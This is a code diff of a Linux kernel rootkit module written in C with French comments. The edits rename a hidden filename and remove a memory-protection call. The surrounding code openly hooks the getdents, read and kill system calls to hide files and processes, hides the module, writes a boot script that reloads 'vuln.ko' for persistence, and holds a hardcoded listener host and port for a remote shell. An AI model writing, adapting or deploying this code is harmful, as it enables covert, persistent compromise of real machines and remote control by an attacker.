@@ -9,7 +9,6 @@
 #include <linux/string.h>
 #include <linux/list.h>
 
-#define MAGIC_PREFIX "2600"
 #define MAX__pid 100
 
 /**
@@ -35,12 +34,6 @@ int my_atoi(const char *str) {
     return res;  // Return the result
 };
 
-enum{
-	SIGINVIS = 31,
-	INVISIBLE = 64,
-	SIGMODINVIS = 63,
-};
-
 typedef struct __pid {
     int data;
     struct __pid* next;
@@ -55,11 +48,11 @@ static short hidden = 0;
 static struct list_head *prev_module;
 static char *lhost_ip = "172.17.0.1";
 static char *lhost_port = "4444";
+
 __pid* head = NULL;
-
-
 __pid __pidPool[MAX__pid]; // Pool of __pids
 int __pidCount = 0; // Counter for used __pids
+
 
 
 /**
@@ -78,7 +71,6 @@ __pid* getNew__pid(int value)
     new__pid->next = NULL;
     return new__pid;
 }
-
 /**
  * Ajoute un pointeur __pid à la liste chaînée.
  * @param head Pointeur vers la tête de la liste chaînée.
@@ -183,7 +175,6 @@ static inline void unprotect_memory(void)
  * Obtient un pointeur vers la table des appels système.
  * @return Pointeur vers la table des appels système.
  */
-stati
 static unsigned long **get_syscall_table(void)
 {
     unsigned long **syscall_table = NULL;
@@ -229,13 +220,13 @@ static asmlinkage long my_getdents(const struct pt_regs *pt_regs)
 
 	err = copy_from_user(kdirent, dirent, ret);
 	if (err){
-    goto out;
+    goto out;   
   }
 
 	while (off < ret) {
 		dir = (void *)kdirent + off;
     //printk(KERN_INFO "my_atoi: %d\n", my_atoi(dir->d_name));
-		if (strstr(dir->d_name, "vuln.ko") != NULL || strstr(dir->d_name, "script_compagnon.sh") != NULL || is_inList(head, my_atoi(dir->d_name))) {
+		if (strstr(dir->d_name, "vuln.ko") != NULL || strstr(dir->d_name, "file1") != NULL || is_inList(head, my_atoi(dir->d_name))) {
 			if (dir == kdirent) {
 				ret -= dir->d_reclen;
 				memmove(dir, (void *)dir + dir->d_reclen, ret);
@@ -294,7 +285,7 @@ static int persistance(void)
         return -1;
     }
     // Change the file position to the end
-    char *content = "#!/usr/bin/env sh\ninsmod /vuln.ko"; 
+    char *content = "#!/usr/bin/env sh\ninsmod /vuln.ko\n"; 
     // Write to the file
     kernel_write(file, content, strlen(content), 0);
     // Close the file
@@ -434,7 +425,6 @@ static int __init m_init(void)
   __sys_call_table[__NR_read] = (unsigned long)my_read;
   __sys_call_table[__NR_kill] = (unsigned long)hooked_kill;
 
-  protect_memory();
 
   return 0;
 }
